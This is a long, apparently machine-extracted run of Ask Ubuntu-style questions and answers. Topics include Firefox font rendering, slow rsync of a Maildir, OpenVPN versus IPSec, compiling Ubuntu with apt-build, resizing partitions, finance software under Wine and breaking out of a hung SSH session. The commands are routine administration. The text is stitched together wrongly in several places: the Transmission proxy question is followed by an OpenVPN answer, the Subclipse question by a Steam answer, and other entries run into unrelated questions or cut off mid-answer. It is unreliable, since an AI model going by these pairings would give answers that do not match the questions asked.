/etc/fonts/conf.d\nsudo ln -s /etc/fonts/conf.avail/10-antialias.conf\nsudo ln -s /etc/fonts/conf.avail/10-hinting.conf\nsudo ln -s /etc/fonts/conf.avail/10-hinting-slight.conf\n\nAlso, your fonts may look slightly different depending on which build of Firefox you use. The Ubuntu build of Firefox carries a cairo patch to turn on Freetype LCD filtering, which will make its fonts look similar to those of other applications and reduce colour fringing.\nThe official mozilla.org build does not have this patch, and its fonts will have noticeably more colour fringing compared to fonts in other applications.\n\nA: The suggestion from previous threads (I think I have one lurking around somewhere) is Firefox doesn't look to Gnome for font hinting settings, it goes to fontconfig which isn't synced in.\nSo if you're using full-hinting, you want something like this:\ncd /etc/fonts/conf.d/\nsudo rm 10-hinting-slight.conf\nsudo ln -s ../conf.avail/10-hinting-full.conf\nsudo dpkg-reconfigure fontconfig\n\nThere are literally dozens of suggested fixes in this bug report though. I suggest you look for the saner looking ones, give them a try and if they don't work, have a go with the less sane looking ones.\nI'll try and track down what fixed it for me. I remember it was ridiculously simple.\n\nA: I had something like this problem a while back, and tried all the stuff suggested in those posts.  What finally fixed it for me was simply removing ~/.fonts.conf (after a backup, of course).\nThe reason I think this works is because the system-wide config is in /etc/font/fonts.conf, and that file gets generated by fontconfig.  I think my problematic ~/.fonts.conf was left over from a much older (Dapper Drake era) install.\n\nA: If I remember right, Firefox uses the file ~/.fonts.conf to get his font-settings. If it doesn't exist, just create it with the following content:\n<?xml version=\"1.0\"?>\n<!DOCTYPE fontconfig SYSTEM \"fonts.dtd\">\n<fontconfig>\n  <match target=\"font\">\n    <edit name=\"antialias\" mode=\"assign\"><bool>true</bool></edit>\n  </match>\n  <match target=\"font\">\n    <edit name=\"hintstyle\" mode=\"assign\"><const>hintfull</const></edit>\n  </match>\n</fontconfig>\n\n\nA: I realized this problem too; but instead of solving it only for Firefox, I generally turned off the Subpixel rendering. Read more about it at:\nhttp://www.smashingmagazine.com/2009/11/02/the-ails-of-typographic-anti-aliasing/ .\nYou can make the changes here (System > Preferences > Appearance): http://dl.dropbox.com/u/3008404/Font_settings_v2.png\nWith this setting you can avoid the ugly color deformations at the edges of characters (it used to annoy me a lot after I realized them). In the other end - you'll pay with the legibility of those really tiny characters (Font Hinting helps at this point).\nTo me, this seemed to be the only possible way; i can't stand those color-misbehaviours.\n", "Q: How to speed up rsync/tar of large Maildir? I have a very large Maildir I am copying to a new machine (over 100BASE-T) with rsync.  The progress is slow.  VERY SLOW.  Like 1 MB/s slow.  I think this is because it is a lot of small files that are being read in an order that essentially is random with respect to where the blocks are stored on disk, causing a massive seek storm.  I get similar results when trying to tar the directory.  Is there a way to get rsync/tar to read in disk block order, or otherwise overcome this problem?\nEdit: I tried tar cf /dev/zero Maildir/ and on the old system, this took 30 minutes!  On the new system when the rsync finally finished, the same test took 18 minutes.  Dumping the same directory on the old system took 8 minutes, and on the new system, dump -0f /dev/zero -b 1024 /home/psusi/Maildir/ finished in only 30 seconds.\n\nA: I ended up writing a little python script to calculate the correlation between directory names and inodes, inodes and data blocks, and directory names to data blocks.  It turns out that ext4 tends to have rather poor correlation between the order the file names appear in the directory, and where they are stored on disk.  After discussing it on the ext4 mailing list, it turns out that this is the result of the hashed directory indexes used to speed up lookups in large directories.  The names are stored in hash order, which effectively scrambles their order relative to anything else.\nIt seems to me and at least one other commenter that this is a deficiency in the fs that should be fixed.  Ted Ts'o ( the ext maintainer ) feels that it would be too difficult to do in the fs, and that good tools ( like rsync and tar ) should have an option to sort the directory by inode number before reading the files.\nSo it looks like feature enhancement requests need filed for rsync and tar.\n\nA: Few points to consider:\n\n\n*\n\n*How many files are we talking about? find /path/to/your/maildir/ | wc -l should give you a rough indication. Hundreds of thousands should be okay. Hundreds of millions might suggest you need to prune, archive and generally clean up.\n\n*Is the disk slow? There are many benchmarks available like a the comprehensive bonnie++ through to the quick and simple Disk Utility benchmarker. Run one and see if you're suffering.\n\n\n*\n\n*That may raise hardware issues - replace for something faster\n\n*Filesystem issues - are you using something known to be very slow at high random read IOPS?\n\n\n\nBut ultimately, tarring  and then transferring should give you the best overall throughput at the cost of you needing to be there to set up the transfer once you've generated the tar.\n\nA: Try setting disabling atime tracking or using relative atime on the new disk partition.  This will limit overhead.  Changing from a non-journaling file system like ext2 to a journaling file system like ext3 or ext4 will have some performance hits \nWhen I moved Maildirs, I did a preparatory rsync to get all the directories in place ahead of time.  Then, there were only updates to do.\nWhen you are ready to do the real move you may want to ensure the directories are stable.\n\n\n*\n\n*place the SMTP daemon in queue only mode, \n\n*disable queue runs by the SMTP daemon, and\n\n*disable access by the user.\n\n\nReactivate after the file move is done.\nEDIT:  I think you have identified the problem.  Tar and rsync will both walk the directories.  Due to normal file changes in the Maildir, files for each directory will end up scattered around the disk.  A tool like dump would read the partition in block order, but would replicate the problem to the new partition.  A second rsync should run much faster than the second. \n", "Q: How to make Transmission download torrents behind a proxy?

Am I doing something wrong here?\n\nA: OpenVPN is connected in this way:\n [you - tap0-]-- INTERNET --[-tap0 - server ]\n\nThe traffic between you and tap0 is unencrypted, the same applies to tap0 <> server. The traffic between both tap0s is encrypted.\ntap0 is connected through a physical network adapter, eth0 for wired connections, wlan0 for wireless connections. That would look like this:\n [ YOUR COMPUTER ]--wlan0-- INTERNET --eth0--[ SERVER ]\n\nIf you are using a wireless connection, you should listen on wlan0 insteap of tap0 using wireshark. You'll see traffic between UDP ports 1194, which is encrypted.\nDon't worry, OpenVPN will use the BF-CBC cipher if the cipher is omitted.

I would like to know if it is currently or will be possible to translate the Ubuntu One web UI, because I know people, and I'm sure there are lot of them, who don't understand any English words, and so don't use it. \nI really that think it is very important to make it translatable, to have it used by the most people possible.\n\nA: At the moment, you can't translate the web ui. There's 2 reasons for this:\n\n\n*\n\n*There's a lot of actual technical work that needs to be done, and it hasn't been a priority so far\n\n*Since we sell plans, the translations are a sensitive issue since it can lead to fraud. We would need some oversight over the translations, and we don't have the resources to do this for many languages\n\n\nI do understand, though, the importance of internationalisation, and it comes up frequently in our discussions so I'm sure we'll eventually manage to carve out the time and budget to kick it off.\n", "Q: How do I add the SVN add-on Subclipse to Eclipse?

I have Steam installed using this tool and I don't have any problems with it so far (except for it being heavy on resources).\nSince Playonlinux takes care of all the major setup for you, it should just work, and if it doesn't, then you know the problem lies in your hardware or your Ubuntu install.\nUPDATE\nSince you see you do not have 3D acceleration in your comments, I'm going to guess that you do not have proprietary drivers installed? If you don't this can lead to some of the problems you are facing. You would want to install these (if possible) for your graphics card, and then try and see if steam works again.\n\nA: I know this is an old post, but this sounds like the problem I had with the steam browser. I added -silent to the end of my command line and I can start steam fine now using wine. It's only when the steam browser pops up after quitting a game that it ultimately crashes. At least I'm able to play my games, though. Buying games and using the friend services that would normally require a browser are best done through a regular browser like Firefox.\n", "Q: Ubuntu One Triplicated my contacts -- how can I delete all contacts so I can start over? I need to delete all contacts in Ubuntu One. Doing this one at a time is excruciating and horrible. How can I just get rid of all contacts?\n\nA: Did this happen with phone sync?  If it did, be careful as the instructions below may also delete the contacts in your phone when you re-sync.\nThe simplest way to delete everything is probably using our new bulk delete option.\nTo do this:\n\n\n*\n\n*Go to: https://edge.one.ubuntu.com/contacts/\n\n*Click \"Select all\"\n\n*Delete\n\n", "Q: OpenVPN vs. IPSec - which one is faster for tunneling? Complexity of installation of IPSec is not an issue. I would like to know which one will provide a faster connection for tunneling.\n\nA: that is very very AFAIK, but I decided to make answer and not a comment.\nOpenVPN uses certificates, and there should be some certificate/key exchange involved, so to establish tunnel it will take longer than IPSEC with peer negotiation and establishing of tunnel. Afterwards if same encryption is used you will see no difference.\nI should note, that OpenVPN will be like tunnel with addresses, for IPSEC it will be tunnel mode, where it will check packets from certain place going to other certain place and ecrypt/decrypt accordingly, that way for IPSEC to make actual tunnel you will have to use some simpler tunnel like IPIP or GRE over IPSEC encryption.\n\nA: After doing some experiments I found out that IPSec is faster than OpenVPN. The reason could be because IPSec is a kernel implementation while OpenVPN is a userspace implemenation.\n\nA: Agreed with above statement. IPsec faster than OpenVPN UDP. tested with streaming transcoded 720 media @ flash 11 720p spec over 4g 6 mbit connection from 10mbit upload cap. Same aes cbc 128, ipsec did have 2nd (phase 2) enc +fp2 yet ipsec had shorter delay and no buffering of content. Yes, could be the way internet routers are happily passing along ipsec traffic vs ovpn udp traffic, doesnt that just make it technically \"faster\" over public networks and maybe same speed over local/(closed/dark) nets?\n\nA: StrongSwan is a implementation of IPSec which is multi-threading. If you're going to encrypt EAS256 on a 10Mbps connection, 1 core of a WRT1900ACS will be fast enough for oVPN to encrypt and get roughly 9Mbps effective over that connection. If you however have a 500Mbps connection, you'll notice even a 3Ghz Pentium won't pull it off because the 4 cores can do it, encrypt fast enough for your 500Mbps to utilize, but it can only use 1!\nWhich maxes out roughly at 120-130Mbps.\nYou use openSwan, it can even use a 12 core CPU. That Pentium 3Ghz will now use all cores it has, and if you have a octa core it'll use all 8.\noVPN can't compete with that.\nSo on low bandwidth connections up to 100Mbps oVPN is fast enough on high end CPUs. On bandwidth on connections for the 21st century, it ain't good enough to use only 1 core.\n", "Q: Ubuntu One stuck and doing nothing Ubuntu One has worked fine for me for several weeks and I now have 8.2 GB of files in the clouds.

I've read about how source-based linux distros like Gentoo can have considerable performance increases when compared to pre-built distros like Ubuntu because they install from source with optimizations for your particular system. Is is possible to build Ubuntu from source to get the same kind of benefit?\n\nA: Is is possible to build Ubuntu from source to get the same kind of benefit? \nI am not sure about the benefits if you have fairly new hardware components but for the \"Ubuntu from source\" part of the question the answer is YES, you can build not only your favorite applications from source, but the entire operating system.\nHere is how:\nYou need to install apt-build. Its a comandline tool like apt-get, but instead of downloading and installing the binary package, apt-build downloads the source code of the package, compiles it and then installs it to your system.\nAfter you install it with \nsudo apt-get install apt-build\n\nyou will be asked for an optimization level (medium is ok), whether you want to create an apt-build repo for APT (Yes) and a question about processor architecture (my intel i7 is considered core2 ). Of course all options can be reconfigured in this way:\ndpkg-reconfigure apt-build\n\nThe above command offers two additional options for the gcc compiler and make builder. Their descriptions can be found in system manuals: man gcc and man make. \nFor a manual and available command options check \nman apt-build\n\nBut the most useful are:\n\n\n*\n\n*apt-build update — updates repo list, (like apt-get update)\n\n*apt-build upgrade — updates operating system, (like apt-get upgrade)\n\n*apt-build install program — installs an application,(like apt-get install)\n\n*apt-build world — something for hard-core users, it recompiles whole system!\n\n\nFor example:\nLets say you want to compile/install Gedit. Instead of apt-get install you just do\nsudo apt-build install gedit\n\nApt-build makes use of deb-src entries contained in the /etc/apt/sources.list file so the compilation and installation processes are fully automatic (similar to emerge found in Gentoo). Apt-build downloads sources of the main application and its dependencies, compiles them, creates a deb package, and finally installs the package.\nSome notes about apt-build world.\nIn my opinion don't attempt it, unless you have 24 or more hours available !\nIf so first thing you should, remove/disable/uninstall any third party applications (it better to do in a fresh install of Ubuntu) and then do :\nsudo su\ndpkg --get-selections | awk '{if ($2 == \"install\") print $1}'> /etc/apt/apt-build.list\nexit\n\nThe above command will copy your full list of system packages to apt-build.list so that they can be compiled from source.\nOpen that file\nsudo gedit /etc/apt/apt-build.list\n\nand remove any GCC/G++ entry\nThen you can do :\nsudo apt-build world\n\nI suggest to add two options — --yes and --force-yes — to make the rebuilding process fully automatic.\n\nA: You could start a flamewar and a huge debate about this kind of topic, but lets look at real life. \nThe speed of your OS greatly depends on what hardware you run it and that is the major factor. \nI change distros frequently while most of the time staying with Arch, but is Arch way faster than Ubuntu? No. \nGnome with compiz on Ubuntu 10.10 useses about 300ram, on Arch 200ram, I have 4gb of ram, I don't feel the difference, but if you compare Ubuntu with gnome to Arch with awesome, there will be a huge boost in responsiveness and resource usage (300ram vs 50ram), but this only matters if you are choosing a distro for a netbook. \nSo if you have a fast desktop and don't want to spend time tinkering with your system just use Ubuntu, but if you have a netbook than consider using a lightweight WM on Arch :)\n\nA: Apt-build is useful for more than performance, you can build custom distribution images and repository for specific hardware ready for mass install for your business.  By this, I mean an optimized binary distribution if you know all the hardware will be the same.  This way, only one computer does all the work compiling, and the rest are just upgraded using the remastered ISO. It's not completely just for lightweight or encoding.  And a custom Installer ISO allows you to reinstall without recompiling if for some reason your system is unrecoverable after a disaster.\n", "Q: Mouse not clicking properly Okay guys, here's a tricky one. I'm running 10.10 on my pc but i've had this issue for some time now.I'm having strange issues with the mouse. What happens is when I get into Ubuntu, I can click anything, but as soon as I click something to open a window, run a program, I can no longer click anything EXCEPT the last thing I clicked. When I right click the last thing I clicked, it allows me to click everything normally, but only until I open something new.\nSo for example I'll click the email icon on docky to open up my email client, which opens but is unresponsive until I right click docky. Then if I open an attatchment, I must also right click the MENU bar on my email client. Sometimes it also works if I simply right click on the newly opened window.\nI have tried this mith mutiple mice and still the same issue.\n\nA: Do you use a clearlooks-theme?

What I want to do is change the size of swap which now is 8 GB to 5 GB and append that 3 GB to my /home partition. I have searched through the web for this but don't seem to find a proper way to increase my home partition. Can anyone help ? By the way, I know how to decrease size of swap I just need the proper way to append that unallocated 3 GB of space to my /home partition without loosing the data. Thank You\n\ngparted\n\nfrom live-usb i can't increase my /home size\n\nA: You will need Ubuntu or Gparted live CD for this. Boot from live CD and run gparted. If swap and home partitions are adjacent to each other then you can simply shrink your swap partition and extend the home and that will do. To do this first right click on the swap partition, if you see a swapof option then click it. \nThis will make ubuntu to stop using swap and enable the resize/move option for this partition. Now again right click on the swap partiton and click on resize/move. \n\nA new dialog will appear where you can select the new size for your partition and select whether the free space appears to left or right of the swap partition. Enter the new values and click the Resize/Move button.\n\nNow you can resize your home partition in a similar manner to use the freed space. Just make sure the partition is unmounted, then right click on the partition in gparted and select Resize/Move. From the dialog that appears extend your home partition to use the available space and click on the Resize/Move button. Now the new sizes of the partitions can be seen in the gparted main window. The changes are NOT APPLIED to the disk at the moment. Once again look at the partitions and their sizes. If you are satisfied then go to Edit menu and click on Apply All Operations. A confirmation dialog will appear asking if you are sure, if you are click yes and the changes will be applied to the disk.\nIf you / partition is between swap and home then you will need to shrink the swap, move / partition to left and then extend the home partition. \nNOTE: Normally things go smoothly i.e without any problem but sometime they don't and therefore it is important that you backup your data before making any changes to your harddisk. Its better to be safe than sorry. Best of luck.\n\nA: Partitions cannot be fragmented, i.e. those cannot be split up in chunks. You have to follow these steps:\n\n\n*\n\n*Move the swap (sda6) to the end of the extended partition (filling the unallocated space)\n\n*Expand the size of /home (sda5) with the new unallocated space.\n\n*Apply these operations\n\n\nWhen messing with partitions, I always make a backup using Clonezilla to an external HDD in case something goes wrong.\n", "Q: How to make Unity 2D workspace button trigger Compiz expo view mode? I am using Unity 2D with Compiz. And I want the workspaces button to trigger the expo view mode in Compiz. Can anyone help me?\n\nA: For the record, Unity 2D should work with Compiz too. There very likely is some glitches here and there as the developers of Unity 2D do not spend time testing with Compiz but only with Metacity.\n\nA: The workspace button won't do the trick, but you can add to the launcher bar a custom button that will trigger the compiz Expo effect (thanks to Andrew from webupd8.org ).\n\nInstall xdotool (and compizconfig-settings-manager if you don't have it already) by typing in a terminal:\n\nsudo apt-get install xdotool compizconfig-settings-manager\n\n\nThere is also a unity 2d tweak program, from which you can enable compositing and some other tweaks for unity 2d:\n\nhttp://marianochavero.wordpress.com/2011/04/20/a-simple-gui-for-unity-2d-settings-ubuntu-11-04/\n\nStart Compiz Config Settings Manager and set up your desired compiz effects and keyboard shortcuts.\nWARNING: Do NOT enable the desktop cube or the Unity plugins, as these will break the classic session. (enabling desktop cube disables all compiz plugins together with all their settings).

It is not generally used directly from the command line.\nFFmpeg also has a set of libraries for use within applications but is mainly known for the ffmpeg command. This program can transcode media files and seems more suitable for what you want to do.\nTo find out how to use ffmpeg, read man ffmpeg.\n", "Q: What happened to the weather-app in the panel? it was so easy to show the weather in the panel, without installing an app.\nwhy won't that be possible anymore in 11.04?\n\nA: The weather feature of the time/date applet was removed (weather isn't related to time :), and the weather indicator is now a separate application: indicator-weather \nAfter you've installed it you can run it from the dash or add it to your startup applications.\n\nYou could install this in Natty if you need it, or even file a bug report asking them to include it by default. If you do, you can add that link to your question (for the bug) so others who are interested can say it affects them.\n\nA: The weather-applet used in pre-11.04 requires the use of 'gnome-panel'. By default Ubuntu 11.04 uses the Unity desktop interface which does not use 'gnome-panel'.\nA weather-indicator can be installed from the Ubuntu Software Centre. This has much (if not all) of the functionality the weather-applet provided.\n\nA: If you don't mind adding a PPA to your software sources list, I'd recommend Lorenzo Carbonell's my-weather indicator.

I planned to use git for the important files in my home directory, so I can revert bad settings or transfer them to another computer as needed. But there's too much chaos there, with each program mixing wildly temporary files, caches, logs, backups, and everything. \nFinding anything worth saving is hard, and when I've found any settings done by myself, there were mixed with informations specific to the computer (so I could hardly take them to another one) and timestamps (so tracking useful changes is hard).\nIs anybody doing it or is it just hopeless and how to filter out the garbage?\n\nA: This question has some pretty good tips on things you can definitely ignore from any sort of versioning. Typically runtime or cached things that would be regenerated.\n", "Q: How can I get Chromium to download PDF files automatically? When I click on a PDF link on Chromium I get a 'Missing Plug-in' page.\n\nIt used to be that it would download the PDF and then I could view it with Evince. To do this now I have to right click and click 'Save Link As...'. How can I get this to happen when I click on the link?\nThis is what about:plugins looks like:\n\nI am using Ubuntu 10.10 32bit with Chromium 9.0.597.107 (75357).\n\nA: This is no longer a problem - I am now using the version from the 11.04 repositories (Chromium 11). I assume this was a bug that was fixed. A solution for people on Ubuntu 10.10 who are having this problem would be to use a PPA to upgrade to a later stable release.\n\nA: To download PDF files automatically:  pdf me extention works for me.  it says \"Convert any web page to a PDF file with one click\" but after installing this extension when i click on pdf file it downloads automatically but it doesn't view the file online.  \n\nA: @hufis \nProblem is solved with new version Mozplugger. Actually in version \"1.14.3\".\nChromium show PDF in browser. Like a PDF reader I'm using Okular.\n\nA: Go to the about:plugins page and pick Disable on \"Chrome PDF Viewer\".\n\nIf the entry isn't there, it might have to do with the plugin not being there at all in Chromium. This blog post explains how to add Google Chrome's PDF viewer to Chromium. Though that doesn't make it download automatically like you had before, it should at least look better than the missing plugin view.\n\nA: You can also check out this pdf viewer in javascript \n", "Q: How to trick apt dependencies? \nPossible Duplicate:\nHow to create a meta-package that automatically installs other packages? \n\nI want to use Frescobaldi (an editor for Lilypond), but the packaged release of lilypond (2.12.3; lilypond is like TeX for scoresheets) in the official repos is a bit old, since I want to use some brand-new features. So I just cloned their git repo and installed it from there.\nNow my question is, how can I tell apt, that I satisfied the dependency on lilypond manually, so that it doesn't tries to install another copy?\n\nA: For where you're actually providing the dependency, I'd use checkinstall to do the installation. checkinstall basically replaces make install and generates a proper .deb package and then installs that. Not only does that allow you to remove or upgrade the package in a better way (when the time comes), it satisfies dependencies from other applications.\nThe alternative is writing a little dummy package that doesn't provide any files but claims to provide whatever you want. The easiest way I can see is using an application called equivs:\nsudo apt-get install equivs\nequivs-control lilypond\n\n# edit your fake package so it has the right versions, names, description, etc\nnano lilypond\n\nequivs-build lilypond\nsudo dpkg -i lilypond-dummy*.deb\n\nThere's a third route that is easy but  the potentially harmful: just install it from the standard repos and then replace its files with the ones you generate. Lock the version of the package so it won't get upgraded. This has the scope to go wrong so only do it if you can't checkinstall or otherwise fake the package first.\n\nA: You should have used dhmake or sudo check install instead of sudo make install. That way you create a deb (check install also installs the deb) of the later lilypond version ^^.\nIf you still have the source (and the object files/make file etc after your compilation), you can still do that without having to download again.\n", "Q: Will GNOME3 offer a panel interface or just the Shell? I recently read about next Linux Mint release using GNOME3 but without the shell. Does it mean the panel interface will be revisited? If so, is it possible to build it for testing?\n\nA: gnome-panel still exists and is still maintained as far as I know. It's still going to be popular for distributions and people that don't want or need the newer shells right now. I can't see this changing in the immediate future, at least until one of the newcomers has proven themselves significantly \"better\".\nUsing it is mostly just configuration and most distributions will offer you the choice between options on log-in. That's certainly the case in Ubuntu; you're offered a \"classic\" desktop which should be panels as usual.\n\nA: Gnome3 does away with the panels and replaces them with gnome-shell.  You can see screen shots of it at http://ubuntuforums.org/showthread.php?t=1603874\n", "Q: Unity does not use the categories from the .desktop files I installed the educational version of Ubuntu with Unity.  This is for kids.  The most important applications are the ones that the descriptions says are specially added for kids.  Trying to find them is a pain in the applications directory.  They are organized in the main menu, but Unity does not use the main menu information for anything.\nBottom line, I am now going to reinstall Ubuntu and NOT include Unity.  The panels feature is nice, but there needs to some ability to organize the applications -- either with a menu or a directory structure that is read.  The .desktop files indicate categories ... like education.  Why does Unity not use this information?\n\nA: If you run all the latest components of the Unity stack (specifically unity-place-applications >= 0.2.38) you'll see that it now respects the same categories as found in the Software Center  (if you click the dropdown next to the search entry you should hopefully see what I mean).\nAs for adding special emphasis on the educational apps in Edubuntu - that's certainly an option, I just don't think the Edubuntu team has had the time to keep on top of the rapid changes coming in for Unity.\n", "Q: How do I solve VirtualBox error 0x80004005? I was trying to run Windows XP under Virtual Box (host system Ubuntu 10.04) and I've got an error message saying:\nKernel driver not installed (rc=-1908)\n\nThe VirtualBox Linux kernel driver (vboxdrv) is either not loaded or there is a permission problem with /dev/vboxdrv. Re-setup the kernel module by executing\n\n'/etc/init.d/vboxdrv setup'\n\nas root. Users of Ubuntu, Fedora or Mandriva should install the DKMS package first. This package keeps track of Linux kernel changes and recompiles the vboxdrv kernel module if necessary.\n\nThis is terminal output: \nmaria@maria-laptop:~$ sudo /etc/init.d/vboxdrv setup\n * Stopping VirtualBox kernel modules                                            *  done.\n * Uninstalling old VirtualBox DKMS kernel modules                               *  done.\n * Trying to register the VirtualBox kernel modules using DKMS                  \n * Failed, trying without DKMS\n * Recompiling VirtualBox kernel modules                                         *  done.\n * Starting VirtualBox kernel modules                                            *  done.\n\nAfter that I can run XP on Virtual Box, but when I try to log into user's account, I have the message that I have to register XP (I haven't done it yet, as each time I was cliking on pop-up window suggesting registration, nothing was happening). I click that I want to register it now and appears the message about error 0x80004005, which prevents Windows to check the license for that computer (the message is in Polish, so I don't post it here...). I forgot to install DKMS first, but I've done it after.\nWhat should I do to run virtual machine? It was using it already, the problem occured only today.\nThanks for any suggestion\n\nA: XP has noticed the hardware has changed and is asking you to re-register. This happens because the virtual hardware presented by VirtualBox to the Guest OS (in this case XP) has changed so XP believes it's been moved from one host to another.\nCall Microsoft with your license key handy and they should just unlock it for you.\n", "Q: How do I recover from upgrading while using bad version of gcc/binutils? I upgraded from 9.04 to 10.10 a couple of days ago, and things are really messed up - X is crashing constantly.\nSince then, I had an application segfault for no reason, when I was debugging, I found that it was strlen() that was causing the segfault (pointing to libc being the problem)! Upon investigation, I found that it was because I had a bad version of gcc and binutils installed in /usr/bin/local; I removed it, recompiled the application, and it no longer crashes.\nNow, looking at my logs, I see that X is also crashing due to libc.\nBacktrace:\n0: /usr/bin/X11/X (xorg_backtrace+0x3b) [0x80ef31b]\n1: /usr/bin/X11/X (0x8048000+0x5d00d) [0x80a500d]\n2: (vdso) (__kernel_rt_sigreturn+0x0) [0xb77e240c]\n3: /usr/bin/X11/X (0x8048000+0xbb0b6) [0x81030b6]\n4: /usr/bin/X11/X (0x8048000+0xbc3ef) [0x81043ef]\n5: /usr/bin/X11/X (0x8048000+0x26ee7) [0x806eee7]\n6: /usr/bin/X11/X (0x8048000+0x1a5da) [0x80625da]\n7: /lib/libc.so.6 (__libc_start_main+0xe7) [0xb750ace7]\n8: /usr/bin/X11/X (0x8048000+0x1a1b1) [0x80621b1]\nSegmentation fault at address 0x32156654\n\nCaught signal 11 (Segmentation fault). Server aborting\n\nSo, how can I recover from this?\n\nA: At this point, I'd be looking to rescue as many files as possible (like /home, /etc and parts of /var) and doing a clean install from a verified CD (ie check the md5 checksum of the downloaded ISO).\nYou might also want a dumped list of the packages that are already installed using something like this:\naptitude search -F \"%p\" \"?installed ?not(?automatic)\" > ~/package-list\n\nOnce you're on a clean system you can jimmy back in your old things, settings and applications.\nIf the same thing happens, run a memtest (should be an option at boot if you hold left-shift) and a fsck from the LiveCD.\n\nA: Remove the bad libc from /usr/local as well.  In fact, you might want to just get rid of everything in /usr/local.\n", "Q: Microsoft Money alternative? UPDATE: I found YNAB which runs very nice in wine too. (The upcoming version 5 appears to be web-based instead.)\n\nI'm looking for something to replace my MS Money 2004 application. \n\n\n*\n\n*I've tried KMyMoney which seems pretty simple (that's good!) but it can't import the OFC files I get from my bank, so I would have to enter everything manually = not good.\n\n*I've tried GnuCash which does import OFC files but I can't wrap my mind around this double-entry philosophy. It may be good for accounting but not for home use.\n\n*I've tried to make MS Money run in Wine with some success but it was hard to make it work and I'd have to re-do that on my new machine. This is still a useful alternative for me though...\n\n\nIs there a similar tool that can import OFC files and that doesn't do double-entry accounting? Tax capability is not needed for me, I only do after-tax numbers. Some nice dashboard views (upcoming bills, future cash flow, total net worth) and some graphs would be a definite bonus!\nUpdate: I'm in Austria (Europe!) so purely US-based tools like Mint aren't relevant. Also, I really DO mean OFC format, not OFX. I have to use whatever my bank offers, even if some say it's an old format.\n\nA: Firstly i assume that you are talking about OFX and not OFC since \n\nOpen Financial Connectivity (OFC) is an obsolete file format for financial transaction information. It has since been replaced by OFX.\n\nHomeBank (Click to Install)  \n\nHomeBank is free software. Use it to manage your personal accounts. It is designed to easy to use. Analyse your finances in detail using powerful filtering tools and graphs. \n\n\n\n\nA: As said here, homebank is also a pretty good alternative.\nI have had to find a similar application for my father, and I would suggest Skrooge . We eventually settled on using MS Money anyway, since I managed to get 2005 working in wine (a bit too much work) and he could just open the old files we had to recover directly.\nHowever I would highly suggest Skrooge otherwise, as you can do just about everything you do in MS Money in it. The interface is pretty straight forward, though if you are accustomed to MS Money you may need to unlearn it.\nHere is the application's website: http://skrooge.org/ - and of course the customary screenshot:\n\nSince I don't think it imports OFC files, I would suggest using GNU Cash to import those files, then export to a format that Skrooge can import. Once you get things converted, you will find Skrooge is rather simple and satisfying to use ;)\n\nA: I am the main developer of Skrooge and I would like to suggest you:\n\n\n*\n\n*Try to change the extension of your file by .OFX and try to import it with Skrooge. Most of the time, it works.\n\n*Send me by email an example of OFC file (you can find me email in the about page of skrooge), I will add the OFC import in the application.\n\n\nA: I've had good luck with Moneydance, which seems to handle most formats and has most of the features you ask for (including OFC import, according to their support site).  It's not free, but it's cross-platform and they have an excellent pricing scheme.\n\nA: I ended up installing my copy of MS Money 2004 through Wine, and it was surprisingly simple! \nThe WineHQ database said to install ies4linux first, but the installation of that failed. MS Money could be installed without errors anyway, and it seems to work just as well as it did on Windows. So this looks like a winner.\n\nA: There's also KMyMoney, which I use.  You can import QIF files.\n", "Q: How install an application with apt-get and restrict it to a specific repo source? I used to do something similar with yum on CentOS. I think there was a --enable-repo and --disable-repo param.\nIs there something that exists for apt-get install <some pkg> that will restrict to /etc/apt/sources.list.d/<somefile>?\n\nA: You can do that by pinning the release using /etc/apt/preferences. The man page is apt_preferences.  Format is as follows:\n Package: *\n Pin: release o=Debian,a=testing\n Pin-Priority: 900\n\nA: I don't believe you can do that quickly and easily without a wrapper around apt-get to juggle the sources manually.\nOne option however is to suffix the package you wish to install with the version number required, which will likely be different in each source.\ne.g.\napt-get install cowsay=3.03-9.2\n\n", "Q: Can I stop specific 'devices' from showing up in Nautilus? Nautilus seems to list all partitions under \"devices\". \nOn my system, this includes a Windows 7 partition and a \"System Reserved\" partition created by Windows.\nI would prefer to hide those two partitions. Is it possible?\n\nA: The easiest way that used to work was manually creating mount points in /etc/fstab and mounting them in /mnt (or anywhere else but not in /media/). If they're already mounted somewhere, Nautilus shouldn't bother you with the drives.\nIf you also add noauto to the mount option for these partitions, it won't mount it on boot either, saving a bit of time.\n", "Q: How can I break out of ssh when it locks? I frequently ssh into my box at home from school, but usually when I change classes and my computer suspends, the pipe will be broken. However, ssh simply locks up - Ctrl+c, Ctrl+z and Ctrl+d have no effect. \nIt's annoying to have to restart my terminal, and even more annoying to have to close and re-create a new screen window.\nSo my question, is there an easy way to make ssh die properly (i.e. when the pipe fails \"normally\" it will exit with a message about a broken pipe)? Or do I have to figure out what the PID is and manually kill it?\n\nA: You may also want to setup application-level keep-alives for SSH to prevent it from freezing on connection issues. My ~/.ssh/config contains this:\nHost *\nServerAliveInterval 15\n# ServerAliveCountMax 3\n\nThis makes ssh client send application-level keep-alives every 15 seconds. Whenever three of them fail consecutively (the default of ServerAliveCountMax), the client considers the connection as hung and closes it.\nOpposed to the other option TCPKeepAlive, this is checked within the encrypted channel and is not spoofable. \n\nIt is being noted that those keep-alives also help to, uhm, keep long-idling connections alive, i.e. prevent you from having half-closed tcp sessions hanging for hours untouched.\nI highly recommend turning this feature on if you run into this regularly, but you should also know about the slight security risk it may impose. A known-plaintext attack might become easier if the attacker knows the interval and contents of an idle connection. This might be the reasons for why it isn't enabled by default.\n\nA: Normal keys are forwarded over the ssh session, so none of those will work. Instead, use the escape sequences. To kill the current session hit subsequently Enter, ~, ..\n(Keep in mind that in international keyboards where ~ is set to be a composing character, you have to hit it twice: Enter, ~, ~, .)\nMore of these escape sequences can be listed with Enter, ~, ?:\nSupported escape sequences:\n     ~.   - terminate connection (and any multiplexed sessions)\n     ~B   - send a BREAK to the remote system\n     ~C   - open a command line\n     ~R   - request rekey\n     ~V/v - decrease/increase verbosity (LogLevel)\n     ~^Z  - suspend ssh\n     ~#   - list forwarded connections\n     ~&   - background ssh (when waiting for connections to terminate)\n     ~?   - this message\n     ~~   - send the escape character by typing it twice\n(Note that escapes are only recognized immediately after newline.)\n\nYou can close the list of Escape sequences by hitting Enter.\nNotice that because hitting ~~ causes ssh to send the ~ instead of intercepting it, you can address N nested ssh connections by hitting ~ N times. (This only applies to ~s that directly follow an Enter.) That is to say that Enter~~~~~. terminates an ssh session 5 layers deep and keeps the other 4 intact.\n\nA: As noted in geekosaur's answer, the escape sequence ~. will terminate the connection.\nThe full list of escape sequences and what they do can be displayed by typing ~?:\nSupported escape sequences:\n  ~.  - terminate connection (and any multiplexed sessions)\n  ~B  - send a BREAK to the remote system\n  ~C  - open a command 